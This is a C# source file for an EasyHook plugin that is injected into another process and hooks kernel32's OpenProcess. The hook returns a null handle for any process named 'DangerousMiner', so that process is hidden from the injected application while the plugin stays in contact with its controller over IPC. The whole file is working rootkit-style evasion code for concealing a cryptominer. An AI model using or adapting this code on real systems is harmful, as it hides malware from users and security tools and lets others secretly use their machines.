using System;
using System.Threading;
using System.Diagnostics;

using EasyHook;

namespace ProcessHidePlugin_EasyHook
{
    public class Main : EasyHook.IEntryPoint
    {
        private ProcessHide_EasyHook.ProcessHideInterface Interface = null;
        private LocalHook OpenProcessHook = null;

        public Main(RemoteHooking.IContext InContext, String InChannelName)
        {
            // Connect to the host.
            Interface = RemoteHooking.IpcConnectClient<ProcessHide_EasyHook.ProcessHideInterface>(InChannelName);
            Interface.Ping();
        }

        public void Run(RemoteHooking.IContext InContext, String InChannelName)
        {
            // Install hook for the kernel32.dll!OpenProcess function.
            // Need to notice host process about any errors during hooking work.
            try
            {
                OpenProcessHook = LocalHook.Create(
                    LocalHook.GetProcAddress("kernel32.dll", "OpenProcess"),
                    new WinAPI.DOpenProcess(OpenProcess_Hook),
                    this);
                OpenProcessHook.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
            }
            catch (Exception ExtInfo)
            {
                Interface.ReportException(ExtInfo);
                return;
            }

            Interface.IsInstalled(RemoteHooking.GetCurrentProcessId());
            RemoteHooking.WakeUpProcess();

            // Wait for host process termination.
            try
            {
                while (true)
                {
                    Thread.Sleep(500);
                    Interface.Ping();
                }
            }
            catch
            {
                // Ping() will raise an exception if host is unreachable.
                // Disable hook for the OpenProcess function on termination.
                OpenProcessHook.ThreadACL.SetInclusiveACL(new Int32[] { 0 });
            }
        }

        private static IntPtr OpenProcess_Hook(WinAPI.ProcessAccessFlags processAccess, bool bInheritHandle, int processId)
        {
            Main This = (Main)HookRuntimeInfo.Callback;

            try
            {
                Process process = Process.GetProcessById(processId);

                // Hide the "DangerousMiner" process from the application in which we injected.
                // Functionality returns NULL for the OpenProcess function, to not show the target process.
                if (process.ProcessName == "DangerousMiner")
                {
                    return IntPtr.Zero;
                }
            }
            catch
            {
            }

            // Calling original Windows API OpenProcess.
            return WinAPI.OpenProcess(processAccess, bInheritHandle, processId);
        }
    }
}
